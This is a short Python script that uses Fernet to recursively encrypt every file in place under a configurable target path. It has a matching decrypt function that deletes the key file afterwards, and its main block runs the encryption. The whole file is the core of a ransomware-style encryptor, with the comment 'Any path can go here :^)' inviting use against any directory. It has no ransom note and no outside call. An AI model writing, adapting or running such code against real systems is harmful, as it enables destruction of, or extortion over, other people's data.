from pathlib import Path
from cryptography.fernet import Fernet

target_path = "" # Any path can go here :^)
KEY_PATH = Path("key.key")


# Generate Encryption/Decryption Key

def generate_key():
    if not KEY_PATH.exists():
        key = Fernet.generate_key()
        KEY_PATH.write_bytes(key)
    else:
        key = KEY_PATH.read_bytes()
    return key

def encrypt(target): # Takes a target path to encrypt all the files inside
    key = generate_key()
    
    for dirpath, dirnames, filenames in Path(target).walk():
        for filename in filenames:
            file_path = dirpath / filename
            
            # Read file contents
            with open(file_path, "rb") as f:
                data = f.read()
                
            # Encrypt
            encrypted_data = Fernet(key).encrypt(data)
            with open(file_path, "wb") as f:
                f.write(encrypted_data)
                
def decrypt(target): # Takes a target path to decrypt all the files inside
    key = generate_key()
    
    for dirpath, dirnames, filenames in Path(target).walk():
        for filename in filenames:
            file_path = dirpath / filename
            
            # Read file contents
            with open(file_path, "rb") as f:
                data = f.read()
                
            # Decrypt
            decrypted_data = Fernet(key).decrypt(data)
            with open(file_path, "wb") as f:
                f.write(decrypted_data)
    
    if KEY_PATH.exists():
        KEY_PATH.unlink()
        
if __name__ == "__main__":
    encrypt(target_path)